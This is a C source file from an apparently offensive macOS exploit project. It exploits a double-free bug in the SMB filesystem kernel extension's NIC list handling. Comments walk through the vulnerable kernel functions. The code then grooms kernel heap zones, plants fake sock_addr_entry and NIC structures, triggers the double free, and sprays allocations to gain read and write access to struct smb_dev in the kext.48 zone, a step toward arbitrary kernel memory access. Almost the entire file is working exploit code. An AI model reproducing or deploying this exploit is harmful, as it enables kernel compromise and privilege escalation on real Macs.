//
//  smb_dev_rw.c
//  xe_kmem
//
//  Created by admin on 2/22/22.
//

#include <assert.h>
#include <stdatomic.h>
#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include <sys/stat.h>

#include <xe/memory/kmem.h>
#include <xe/slider/kext.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/xnu/proc.h>

#include <smbfs/kext.h>

#include "memory/allocator_rw.h"
#include "memory/allocator_nrnw.h"
#include "memory/kheap_alloc.h"
#include "memory/kheap_free.h"
#include "memory/safe_release.h"
#include "smb/client.h"
#include "smb/params.h"

#include "smb_dev_rw.h"


///
/// This module exploits the double free vulnerability demonstrated in "poc/poc_double_free"
/// to obtain read write access to `struct smb_dev` allocated on kext.48 zone.
///
/// From the PoC, we know that we can get a NIC released twice by trying to associate a socket
/// address with zero length to the NIC. The info about NICs in client machine are stored in
/// `session->session_interface_table.client_nic_info_list`. The `client_nic_info_list` is a tailq with
/// elements of type `struct complete_nic_info_entry`. When we try to associate a socket address
/// of zero length to a NIC which is already in the `client_nic_info_list`, the method
/// `smb2_mc_add_new_interface_info_to_list` will first release the NIC by calling
/// `smb2_mc_release_interface`  and then the method `smb2_mc_parse_client_interface_array`
/// will release all the NICs in `client_nic_info_list` by calling `smb2_mc_release_interface_list`.
/// Since the method `smb2_mc_add_new_interface_info_to_list` only released the NIC and did
/// not remove the released NIC from the `client_nic_info_list`, the NIC will get released twice.
///
/// The method responsible for releasing all the NICs from `client_nic_info_list` is
/// `smb2_mc_release_interface_list` and is defined in `smb2_mc_support.c`. The
/// method is defined as follows:-
///
/// static void
/// smb2_mc_release_interface_list(struct interface_info_list* list)
/// {
///     struct complete_nic_info_entry* info;
///
///     if (TAILQ_EMPTY(list))
///         return;
///
///     // Call `smb2_mc_release_interface` on each NIC in the list
///     while ((info = TAILQ_FIRST(list)) != NULL) {
///         smb2_mc_release_interface(list, info, NULL);
///     }
/// }
///
/// The method responsible for releasing an individual NIC is `smb2_mc_release_interface`
/// defined in `smb2_mc_support.c`. This method is defined as follows
///
/// static void
/// smb2_mc_release_interface(
///     struct interface_info_list* list,
///     struct complete_nic_info_entry* interface,
///     uint32_t *p_nic_count)
/// {
///     struct sock_addr_entry* addr;
///
///     // Release all the IP addresses associated with the NIC
///     while ((addr = TAILQ_FIRST(&interface->addr_list)) != NULL) {
///         TAILQ_REMOVE(&interface->addr_list, addr, next);
///         // ***NOTE***: Release the socket address
///         SMB_FREE(addr->addr, M_NSMBDEV);
///         // ***NOTE***: Release the tailq entry of type `struct sock_addr_entry`
///         SMB_FREE(addr, M_NSMBDEV);
///     }
///
///     // If the list parameter is specified, the released interface is also
///     // removed from the corresponding tailq
///     if (list != NULL)
///         TAILQ_REMOVE(list, interface, next);
///
///     if (p_nic_count)
///         (*p_nic_count)--;
///
///     SMB_LOG_MC("freeing nic idx %llu(RSS_%llu).\n",
///         interface->nic_index  & SMB2_IF_INDEX_MASK,
///         interface->nic_index >> SMB2_IF_RSS_INDEX_SHIFT);
///
///     SMB_FREE(interface, M_NSMBDEV);
/// }
///
/// As noted above, when the NIC is released, all the dynamically allocated socket address and
/// `struct sock_addr_entry` in the `interface->addr_list` is also released. So if we can allocate a
/// fake NIC (of type `struct complete_nic_info_entry`) in the memory location of double free NIC
/// after first release and before second release, we can get each entry in the `fake_nic->addr_list`
/// released using `SMB_FREE`. By constructing `fake_nic->addr_list` with pointers to memory
/// location in `kext.48` zone, we can get these memory locations released. This can be used to
/// get read write access to `struct smb_dev` allocated in kext.48 zone.
///
///


static_assert(sizeof(struct smb_dev) == 48, "");

#define NUM_KEXT_32_FRAGMENTED_PAGES    1024
#define MAX_SOCK_ADDR_ENTRY_ALLOC_TRIES 100
#define MAX_SOCK_ADDR_ALLOC_TRIES       100

#define NUM_DBF_CAPTURE_ALLOCS       256
#define NUM_SMB_DEV_CAPTURE_ALLOCS   512
#define NUM_SMB_DEV_RECAPTURE_ALLOCS 512


static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
    .sin6_len = sizeof(struct sockaddr_in6),
    .sin6_family = AF_INET6,
    .sin6_port = 1234
};


typedef struct smb_dev_rw_session_shared {
    _Atomic int ref_cnt;
    xe_kheap_free_session_t dbf_session;
    xe_allocator_prpw_t sockaddr_allocator;
    xe_allocator_prpw_t sock_addr_entry_allocator;
} *smb_dev_rw_session_shared_t;


smb_dev_rw_session_shared_t smb_dev_rw_shared_session_create(xe_kheap_free_session_t dbf_session) {
    struct smb_dev_rw_session_shared* session = malloc(sizeof(struct smb_dev_rw_session_shared));
    session->ref_cnt = 1;
    session->dbf_session = dbf_session;
    session->sockaddr_allocator = NULL;
    session->sock_addr_entry_allocator = NULL;
    return session;
}


smb_dev_rw_session_shared_t smb_dev_rw_shared_session_ref(smb_dev_rw_session_shared_t session) {
    int old = atomic_fetch_add(&session->ref_cnt, 1);
    xe_assert(old >= 0);
    return session;
}


void smb_dev_rw_shared_session_destroy(smb_dev_rw_session_shared_t session) {
    xe_slider_kext_t slider = xe_slider_kext_create(KEXT_SMBFS_IDENTIFIER, XE_KC_BOOT);
    xe_kheap_free_session_destroy(&session->dbf_session, slider);
    if (session->sock_addr_entry_allocator) {
        /// Patch the `client_nic_info_list` to prevent NICs from being released
        xe_allocator_prpw_iter_backends(session->sock_addr_entry_allocator, ^(int fd) {
            xe_safe_release_reset_client_nics(fd, slider);
        });
        xe_allocator_prpw_destroy(&session->sock_addr_entry_allocator);
    }
    if (session->sockaddr_allocator) {
        /// Patch the `client_nic_info_list` to prevent NICs from being released
        xe_allocator_prpw_iter_backends(session->sockaddr_allocator, ^(int fd) {
            xe_safe_release_reset_client_nics(fd, slider);
        });
        xe_allocator_prpw_destroy(&session->sockaddr_allocator);
    }
    xe_slider_kext_destroy(&slider);
    free(session);
}


void smb_dev_rw_shared_session_unref(smb_dev_rw_session_shared_t* sessionp) {
    smb_dev_rw_session_shared_t session = *sessionp;
    int old = atomic_fetch_sub(&session->ref_cnt, 1);
    if (old == 1) {
        smb_dev_rw_shared_session_destroy(session);
    } else {
        xe_assert_cond(old, >, 1);
    }
    *sessionp = NULL;
}


struct smb_dev_rw {
    int fd_dev;
    int fd_rw;
    _Bool rw_data1;
    _Bool active;
    
    struct sockaddr_in smb_addr;
    struct smb_dev_rw_session_shared* session;
    
    struct smb_dev backup;
};


/// Build a fake socket address which can be used to construct a fake sock_addr_entry
/// NOTE: The layout of `struct sock_addr_entry` is as follows
///
/// struct sock_addr_entry {
///   struct sockaddr* addr;
///   TAILQ_ENTRY(sock_addr_entry) next;
/// };
///
/// The fake sock_addr_entry is allocated using `xe_kheap_alloc` which allocates provided
/// data as a socket address. This means that the first byte in allocated data will always be the
/// size of allocation. Since we want to acheive read write on smb_dev which is allocated on
/// kext.48 zone, we want the fake sock_addr_entry and fake socket_address to be allocated on
/// kext.48 zone.
struct xe_kheap_alloc_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, xe_allocator_nrnw_t nrnw_allocator) {
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        struct xe_kheap_alloc_entry entry = xe_kheap_alloc(smb_addr, 48, AF_INET, NULL, 0, 8);
        uintptr_t addr = entry.address;
        uint8_t sa_len = (uint8_t)addr;
        uint8_t sa_family = (uint8_t)(addr >> 8);
        /// The address of this fake_sock_addr will be set as the value of pointer `addr` in
        /// the fake sock_addr_entry. Since the member `addr` is the first member of the
        /// `struct sock_addr_entry`, and since this member will be sharing data with the
        /// `sa_len` and `sa_family` fields of the allocated socket address, we want the value
        /// of pointer `addr` to have LSB value 48. We will keep on allocating fake sock_addr
        /// until we get a allocated address with LSB value 48
        if (sa_len == 48 && sa_family != AF_INET && sa_family != AF_INET6) {
            return entry;
        } else {
            /// Stir the pot
            xe_allocator_nrnw_allocate(nrnw_allocator, 48, random() % 128);
            xe_allocator_prpw_destroy(&entry.element_allocator);
        }
    }
    xe_log_error("failed to allocate kext.48 element having address ending with 48");
    xe_abort();
}


struct xe_kheap_alloc_entry smb_dev_rw_alloc_sock_addr_entry(const struct sockaddr_in* smb_addr, uintptr_t sock_addr, uintptr_t tqe_prev) {
    uint8_t sa_len = (uint8_t)sock_addr;
    xe_assert(sa_len == 48);
    uint8_t sa_family = (uint8_t)(sock_addr >> 8);
    xe_assert(sa_family != AF_INET && sa_family != AF_INET6);
    
    struct sock_addr_entry entry;
    entry.addr = (struct sockaddr*)sock_addr;
    entry.next.tqe_next = 0;
    entry.next.tqe_prev = (struct sock_addr_entry**)tqe_prev;
    
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        struct xe_kheap_alloc_entry alloc = xe_kheap_alloc(smb_addr, sa_len, sa_family, (char*)&entry + 2, sizeof(entry) - 2, 2);
        uintptr_t allocated_address = alloc.address;
        if (allocated_address % 32 == 0) {
            xe_allocator_prpw_destroy(&alloc.element_allocator);
        } else {
            return alloc;
        }
    }
    xe_log_error("failed to allocate sock_addr");
    xe_abort();
}


void smb_dev_rw_fragment_kext_32(const struct sockaddr_in* smb_addr, xe_allocator_nrnw_t nrnw_allocator) {
    xe_allocator_nrnw_t gap_allocator = xe_allocator_nrnw_create(smb_addr);
    for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
        xe_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
        xe_allocator_nrnw_allocate(gap_allocator, 32, (XE_PAGE_SIZE / 32) - 2);
    }
    xe_allocator_nrnw_destroy(&gap_allocator);
}


/// Create a `smb_dev_rw` from allocation of `xe_allocator_rw_t` replaced by a `struct smb_dev`
struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_addr, int fd_dev, int fd_rw, smb_dev_rw_session_shared_t session) {
    xe_assert_cond(fd_rw, >=, 0);
    
    struct smb_dev_rw* dev_rw = malloc(sizeof(struct smb_dev_rw));
    bzero(dev_rw, sizeof(struct smb_dev_rw));
    dev_rw->smb_addr = *smb_addr;
    dev_rw->fd_rw = fd_rw;
    dev_rw->fd_dev = fd_dev;
    dev_rw->rw_data1 = TRUE;
    dev_rw->session = smb_dev_rw_shared_session_ref(session);
    dev_rw->active = FALSE;
    
    if (fd_dev < 0) {
        return dev_rw;
    }
    
    /// Sometimes the `xe_allocator_rw_t` allocation might get replaced by an allocation in
    /// default.48 other that `struct smb_dev`. We can detect this by reading the data and
    /// validating it for a valid `struct smb_dev`
    struct smb_dev captured_smb_dev;
    int error = smb_client_ioc_auth_info(fd_rw, (char*)&captured_smb_dev, sizeof(captured_smb_dev), NULL, 0, NULL);
    xe_assert_err(error);
    
    xe_log_debug_hexdump(&captured_smb_dev, sizeof(captured_smb_dev), "captured rw_allocator at fd: %d with data: ", fd_rw);
    
    /// `captured_smb_dev->sd_rwlock` should be a valid lck_rw_t
    if (captured_smb_dev.sd_rwlock.opaque[0] != 0x420000 || captured_smb_dev.sd_rwlock.opaque[1] != 0) {
        goto bad;
    }
    
    if (!xe_vm_kernel_address_valid((uintptr_t)captured_smb_dev.sd_devfs)) {
        goto bad;
    }
    
    if (captured_smb_dev.sd_session != NULL || captured_smb_dev.sd_share != NULL) {
        goto bad;
    }
    
    if (captured_smb_dev.sd_flags != (NSMBFL_OPEN | NSMBFL_CANCEL)) {
        goto bad;
    }
    
    dev_rw->backup = captured_smb_dev;
    dev_rw->active = TRUE;
    return dev_rw;
    
bad:
    close(dev_rw->fd_dev);
    dev_rw->fd_dev = -1;
    dev_rw->active = FALSE;
    return dev_rw;
}


void smb_dev_rw_match_dev_to_rw(int capture_smb_devs[NUM_SMB_DEV_CAPTURE_ALLOCS], const int* rw_fds, int* matched_captures, int num_rw_fds) {
    int rw_fds_to_match[num_rw_fds];
    memcpy(rw_fds_to_match, rw_fds, sizeof(rw_fds_to_match));
    
    for (int capture_dev_idx=0; capture_dev_idx<NUM_SMB_DEV_CAPTURE_ALLOCS; capture_dev_idx++) {
        int capture_dev = capture_smb_devs[capture_dev_idx];
        xe_assert_cond(capture_dev, >=, 0);
        
        /// This will set `NSMBFL_CANCEL` flag in `smb_dev->sd_flags`
        int error = smb_client_ioc_cancel_session(capture_dev);
        xe_assert_err(error);
        
        for (int rw_dev_idx = 0; rw_dev_idx<num_rw_fds; rw_dev_idx++) {
            int rw_dev = rw_fds_to_match[rw_dev_idx];
            if (rw_dev < 0) {
                continue;
            }
            
            /// Read the memory of `xe_allocator_rw_t` allocation
            struct smb_dev smb_dev;
            static_assert(sizeof(smb_dev) == 48, "");
            error = smb_client_ioc_auth_info(rw_dev, (char*)&smb_dev, 48, NULL, 0, NULL);
            xe_assert_err(error);
            
            /// If the `sd_flags` of read `smb_dev` also changed, we got a match
            if (smb_dev.sd_flags & NSMBFL_CANCEL) {
                matched_captures[rw_dev_idx] = capture_dev;
                capture_smb_devs[capture_dev_idx] = -1;
                rw_fds_to_match[rw_dev_idx] = -1;
            }
        }
    }
}


/// Exploit double free vulnerability in `smb2_mc_parse_client_interface_array` to achieve
/// read write access to smb dev (`struct smb_dev`) in kext.48 zone
void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[2]) {
    xe_allocator_nrnw_t nrnw_allocator = xe_allocator_nrnw_create(smb_addr);
    
    /// Make sure OOB reads in kext.32 zone will not cause kernel data abort
    smb_dev_rw_fragment_kext_32(smb_addr, nrnw_allocator);
    
    /// STEP 1: Allocate a socket address in kext.48 zone with the address of the allocated
    /// socket address ending with 48
    struct xe_kheap_alloc_entry fake_sockaddr_alloc = smb_dev_rw_alloc_sock_addr(smb_addr, nrnw_allocator);
    uintptr_t fake_sockaddr = fake_sockaddr_alloc.address;
    xe_log_debug("allocated socket_address at %p", (void*)fake_sockaddr);
    
    xe_kheap_free_session_t dbf_session = xe_kheap_free_session_create(smb_addr);
    
    /// STEP 2: Leak the memory of a NIC entry (`struct complete_nic_info_entry`)
    struct complete_nic_info_entry dbf_nic = xe_kheap_free_session_prepare(dbf_session);
    uintptr_t dbf_nic_addr = ((uintptr_t)dbf_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections));
    xe_log_debug("leaked nic at %p", (void*)dbf_nic_addr);
    
    xe_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 32);
    
    /// STEP 3: Allocate a fake `struct sock_addr_entry` in kext.48 zone with the value of members
    /// `entry->addr = fake_sockaddr`, `entry->next.tqe_next = NULL` and
    /// `entry->next.tqe_prev = dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first)`.
    /// This allocated fake `sock_addr_entry` must be a valid tailq entry (`TAILQ_CHECK_NEXT` and
    /// `TAILQ_CHECK_PREV` must not panic)
    struct xe_kheap_alloc_entry fake_sock_addr_entry_alloc = smb_dev_rw_alloc_sock_addr_entry(smb_addr, fake_sockaddr, dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first));
    uintptr_t fake_sock_addr_entry = fake_sock_addr_entry_alloc.address;
    xe_log_debug("allocated sock_addr_entry at %p", (void*)fake_sock_addr_entry);
    
    xe_allocator_rw_t capture_allocator = xe_allocator_rw_create(smb_addr, NUM_DBF_CAPTURE_ALLOCS);
    
    /// STEP 4: Construct a fake `struct complete_nic_info_entry` which can serve as a replacement
    /// for the leaked `dbf_nic`. This must also be a valid tailq entry
    struct complete_nic_info_entry fake_nic = dbf_nic;
    /// Replace the `addr_list` tailq head with `fake_sock_addr_entry`
    fake_nic.addr_list.tqh_first = (struct sock_addr_entry*)fake_sock_addr_entry;
    fake_nic.addr_list.tqh_last = 0;
    
    char* capture_data = alloca(48);
    bzero(capture_data, 48);
    memcpy(capture_data, &SMB_DEV_CAPTURE_DATA, sizeof(SMB_DEV_CAPTURE_DATA));
    
    xe_log_debug("begin double free");
    /// STEP 5: Trigger the double free of the leaked `dbf_nic`. Also in the same time, spray the
    /// zone kext.96 with data of `fake_nic` so that after first release and before second release,
    /// the memory location of `dbf_nic` will be replaced with data from `fake_nic`. This will lead
    /// to the memory of `fake_sockaddr` and `fake_sock_addr_entry` from being released
    xe_kheap_free_session_execute(dbf_session, &fake_nic);
    
    /// STEP 6: Spray kext.48 zone with allocations from `xe_allocator_rw_t`. This will lead to
    /// released memory of `fake_sockaddr` and `fake_sock_addr_entry` from being replaced
    /// by an allocation of `xe_allocator_rw_t`.
    int error = xe_allocator_rw_allocate(capture_allocator, NUM_DBF_CAPTURE_ALLOCS, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
        *data1 = capture_data;
        *data1_size = 48;
        *data2 = NULL;
        *data2_size = 0;
    }, NULL);
    xe_assert_err(error);
    xe_log_debug("double free complete");
    
    xe_allocator_prpw_data_filter filter = ^_Bool(void* ctx, sa_family_t address_family, size_t idx) {
        return address_family == SMB_DEV_CAPTURE_DATA.sin6_family;
    };
    
    int64_t sockaddr_found_index = -1;
    /// Check whether the memory of `fake_sockaddr` was replaced by a allocation from heap
    /// spray in STEP 6
    error = xe_allocator_prpw_filter(fake_sockaddr_alloc.element_allocator, 0, xe_allocator_prpw_get_capacity(fake_sockaddr_alloc.element_allocator), filter, NULL, &sockaddr_found_index);
    xe_assert_err(error);
    
    int64_t sock_addr_entry_found_index = -1;
    /// Check whether the memory of `fake_sock_addr_entry` was replaced by an allocation
    /// from heap spray in STEP 6
    error = xe_allocator_prpw_filter(fake_sock_addr_entry_alloc.element_allocator, 0, xe_allocator_prpw_get_capacity(fake_sock_addr_entry_alloc.element_allocator), filter, NULL, &sock_addr_entry_found_index);
    xe_assert_err(error);
    
    if (sock_addr_entry_found_index < 0 && sockaddr_found_index < 0) {
        xe_log_error("failed to capture both kext.48 allocs using rw allocator");
        getpass("[INFO] press enter to continue. THIS WILL CAUSE KERNEL PANIC\n");
        xe_abort();
    } else if (sock_addr_entry_found_index < 0) {
        xe_log_warn("failed to capture fake_sock_addr_entry using rw allocator");
    } else if (sockaddr_found_index < 0) {
        xe_log_warn("failed to capture fake_sockaddr using rw allocator");
    }
    
    int num_slots = (sock_addr_entry_found_index >= 0) + (sockaddr_found_index >= 0);
    xe_log_debug("got %d slots in kext.48 which could be used to capture smb_dev", num_slots);
    
    int* capture_smb_devs = alloca(sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
    memset(capture_smb_devs, -1, sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
    
    /// STEP 7: Release the memory of `fake_sock_addr_entry` and `fake_sockaddr` using
    /// references by `fake_sock_addr_entry_alloc` and `fake_sockaddr_alloc`. Also spray kext.48
    /// zone with `struct smb_dev` by opening new smb devices using `smb_client_open_dev`.
    /// This will lead to the memory of `fake_sock_addr_entry` and `fake_sockaddr` from being
    /// replaced by a `struct smb_dev`. Since the memory of `fake_sock_addr_entry` and
    /// `fake_sockaddr` is still being refrenced by allocations from `xe_allocator_rw_t`, we can
    /// obtain read write access to them
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        if (idx == 0) {
            if (sock_addr_entry_found_index >= 0) {
                int error = xe_allocator_prpw_release_containing_backend(fake_sock_addr_entry_alloc.element_allocator, sock_addr_entry_found_index);
                xe_assert_err(error);
            }
            if (sockaddr_found_index >= 0) {
                int error = xe_allocator_prpw_release_containing_backend(fake_sockaddr_alloc.element_allocator, sockaddr_found_index);
                xe_assert_err(error);
            }
        }
        capture_smb_devs[idx] = smb_client_open_dev();
        xe_assert(capture_smb_devs[idx] >= 0);
    });
    
    /// STEP 8: Filter out `xe_allocator_rw_t` backends whose data changed. The memory allocated
    /// by these backends got released when a `xe_allocator_prpw_t` backend was released
    /// in STEP 7
    int dev_rw_fds[num_slots];
    for (int i = 0; i<num_slots; i++) {
        int capture_idx = -1;
        /// Find out which allocation of `xe_allocator_rw_t` got changed. `SMB_DEV_CAPTURE_DATA`
        /// is the data we used during allocation.
        int error = xe_allocator_rw_filter(capture_allocator, 0, xe_allocator_rw_get_backend_count(capture_allocator), 48, 0, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
            if (memcmp(data1, &SMB_DEV_CAPTURE_DATA, sizeof(SMB_DEV_CAPTURE_DATA)) != 0) {
                return TRUE;
            }
            return FALSE;
        }, NULL, &capture_idx);
        xe_assert_err(error);
        
        if (capture_idx >= 0) {
            dev_rw_fds[i] = xe_allocator_rw_disown_backend(capture_allocator, capture_idx);
            xe_log_debug("memory allocated by dev_rw at fd: %d changed", dev_rw_fds[i]);
        } else {
            /// Since we can only read one byte of data (address family) using `xe_allocator_prpw_t`
            /// we might have matched it with allocation on kext.48 zone done by someone other than
            /// `xe_allocator_rw_t`. Unlikely but can happen.
            xe_log_warn("num_slots mismatch, current: %d, actual: %d", num_slots, i);
            num_slots = i;
            break;
        }
        
    }
    
    /// STEP 9: Find out the file descriptor of smb devices whose `struct smb_dev` shares memory
    /// with `xe_allocator_rw_t` backends filtered out in STEP 8
    int smb_dev_fds[num_slots];
    memset(smb_dev_fds, -1, sizeof(smb_dev_fds));
    smb_dev_rw_match_dev_to_rw(capture_smb_devs, dev_rw_fds, smb_dev_fds, num_slots);
    
    smb_dev_rw_session_shared_t session = smb_dev_rw_shared_session_create(dbf_session);
    xe_assert_cond(num_slots, <=, 2);
    memset(dev_rws, 0, sizeof(smb_dev_rw_t) * 2);
    
    /// STEP 10: Create `smb_dev_rw` for each captured `xe_allocator_rw_t` and smb_device
    /// pair. Verify that the memory pointed by filtered `xe_allocator_rw_t` is a valid `struct smb_dev`
    /// and mark the verfied ones as active. We keep the inactive ones because releasing them
    /// at this time might cause kernel panic. The memory allocated by those `xe_allocator_rw_t`
    /// backends are either now in free state or allocated to some other allocation in kext.48 zone.
    /// Later when we have arbitary kernel memory read write, we will clean up these inactive
    /// `smb_dev_rw` so that they can be safely released
    int num_active_devs = 0;
    for (int i=0; i<num_slots; i++) {
        dev_rws[i] = smb_dev_rw_create_from_capture(smb_addr, smb_dev_fds[i], dev_rw_fds[i], session);
        if (dev_rws[i]->active) {
            num_active_devs++;
        }
    }
    
    /// Release unused smb devices
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        if (capture_smb_devs[idx] >= 0) {
            close(capture_smb_devs[idx]);
        }
    });
    
    xe_allocator_rw_destroy(&capture_allocator);
    
    if (sockaddr_found_index >= 0) {
        xe_allocator_prpw_destroy(&fake_sockaddr_alloc.element_allocator);
    } else {
        /// Fake sockaddr allocation is currently sharing memory with an unknown
        /// allocated / free element in kext.48 zone. Releasing it now may panic, so we will
        /// patch and release it once we have working arbitary kernel memory read / write
        session->sockaddr_allocator = fake_sockaddr_alloc.element_allocator;
    }
    
    if (sock_addr_entry_found_index >= 0) {
        xe_allocator_prpw_destroy(&fake_sock_addr_entry_alloc.element_allocator);
    } else {
        /// Fake sock_addr_entry allocation is currently sharing memory with an unknown
        /// allocated / free element in kext.48 zone. Releasing it now may panic, so we will
        /// patch and release it once we have working arbitary kernel memory read / write
        session->sock_addr_entry_allocator = fake_sock_addr_entry_alloc.element_allocator;
    }
    
    xe_allocator_nrnw_destroy(&nrnw_allocator);
    
    xe_log_debug("smb_dev_rw created with %d active backends", num_active_devs);
    smb_dev_rw_shared_session_unref(&session);
}

void smb_dev_rw_read_data(smb_dev_rw_t dev, struct smb_dev* out) {
    xe_assert(dev->active == TRUE);
    uint32_t cpn_len = dev->rw_data1 ? 48 : UINT32_MAX;
    uint32_t spn_len = dev->rw_data1 ? UINT32_MAX : 48;
    
    int error = smb_client_ioc_auth_info(dev->fd_rw, (char*)out, cpn_len, (char*)out, spn_len, NULL);
    xe_assert_err(error);
}

int smb_dev_rw_write_data(smb_dev_rw_t dev, const struct smb_dev* data) {
    xe_assert(dev->active == TRUE);
    struct smb_dev data_copy = *data;
    
    /// Clear the `NSMBFS_CANCEL` flag if present because we need this flag
    /// cleared to identify successful write
    data_copy.sd_flags &= ~NSMBFL_CANCEL;
    
    xe_log_debug_hexdump(data, sizeof(*data), "writing smb_dev at %d with:", dev->fd_dev);
    
    xe_allocator_rw_t capture_allocator = xe_allocator_rw_create(&dev->smb_addr, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2);
    
    /// Release the `xe_allocator_rw_t` backend
    close(dev->fd_rw);
    
    /// Spray kext.48 with new data
    int error = xe_allocator_rw_allocate(capture_allocator, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
        *data1 = (char*)&data_copy;
        *data1_size = 48;
        *data2 = (char*)&data_copy;
        *data2_size = 48;
    }, NULL);
    xe_assert_err(error);
    
    /// Set the `NSMBFS_CANCEL` flag. This can be used to identify which `xe_allocator_rw_t`
    /// backend is now sharing the memory with `struct smb_dev` of `fd_dev`
    error = smb_client_ioc_cancel_session(dev->fd_dev);
    if (error == EBADF) {
        xe_allocator_rw_destroy(&capture_allocator);
        return error;
    }
    xe_assert_err(error);
    
    data_copy.sd_flags |= NSMBFL_CANCEL;
    /// Find out which `xe_allocator_rw_t` backend replaced the `struct smb_dev`
    /// data of `fd_dev`
    int found_idx;
    error = xe_allocator_rw_filter(capture_allocator, 0, xe_allocator_rw_get_backend_count(capture_allocator), 48, 48, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        /// Each `xe_allocator_rw_t` backend can allocate a pair of read write data
        /// Find out which one of those are now sharing memory with `struct smb_dev`
        struct smb_dev* dev1 = (struct smb_dev*)data1;
        struct smb_dev* dev2 = (struct smb_dev*)data2;
        
        if (memcmp(dev1, &data_copy, sizeof(*dev1)) == 0) {
            dev->rw_data1 = TRUE;
            return TRUE;
        }
        
        if (memcmp(dev2, &data_copy, sizeof(*dev1)) == 0) {
            dev->rw_data1 = FALSE;
            return TRUE;
        }
        
        return FALSE;
    }, NULL, &found_idx);
    
    if (found_idx < 0) {
        /// None of the `xe_allocator_rw_t` backend allocations replaced the `struct smb_dev`
        /// data of `fd_dev`. Mark this backend as inactive. The `fd_dev` should not be used
        /// anymore because it might cause kernel panic
        dev->active = FALSE;
        dev->fd_rw = -1;
        dev->fd_dev = -1;
        error = EIO;
        xe_log_debug("smb_dev_rw write failed");
    } else {
        dev->fd_rw = xe_allocator_rw_disown_backend(capture_allocator, (int)found_idx);
        error = 0;
        xe_log_debug("smb_dev_rw write ok");
    }
    
    /// Release unused smb devices
    xe_allocator_rw_destroy(&capture_allocator);
    return error;
}

int smb_dev_rw_read(smb_dev_rw_t dev, struct smb_dev* out) {
    if (!dev->active) {
        return EBADF;
    }
    smb_dev_rw_read_data(dev, out);
    return 0;
}

int smb_dev_rw_write(smb_dev_rw_t dev, const struct smb_dev* data) {
    if (!dev->active) {
        return EBADF;
    }
    return smb_dev_rw_write_data(dev, data);
}

int smb_dev_rw_get_dev_fd(smb_dev_rw_t dev) {
    return dev->fd_dev;
}

_Bool smb_dev_rw_is_active(smb_dev_rw_t dev) {
    return dev->active;
}

uintptr_t smb_dev_rw_get_session(smb_dev_rw_t dev) {
    struct smb_dev smb_dev;
    int error = smb_dev_rw_read(dev, &smb_dev);
    xe_assert_err(error);
    return (uintptr_t)smb_dev.sd_session;
}

void smb_dev_rw_destroy(smb_dev_rw_t* rw_p) {
    smb_dev_rw_t rw = *rw_p;
    
    xe_slider_kext_t slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
    
    if (rw->fd_dev >= 0) {
        struct smb_dev restore;
        bzero(&restore, sizeof(restore));
        restore.sd_rwlock.opaque[0] = 0x420000;
        restore.sd_rwlock.opaque[1] = 0;
        restore.sd_devfs = rw->backup.sd_devfs;
        restore.sd_flags = NSMBFL_OPEN;
        restore.sd_share = NULL;
        restore.sd_session = NULL;
        xe_safe_release_restore_smb_dev(&rw->smb_addr, rw->fd_dev, &restore, rw->active, slider);
        close(rw->fd_dev);
    }

    if (rw->fd_rw >= 0) {
        xe_safe_release_reset_auth_info(rw->fd_rw, slider);
        close(rw->fd_dev);
    }
    
    smb_dev_rw_shared_session_unref(&rw->session);
    
    xe_slider_kext_destroy(&slider);
    free(rw);
    *rw_p = NULL;
}
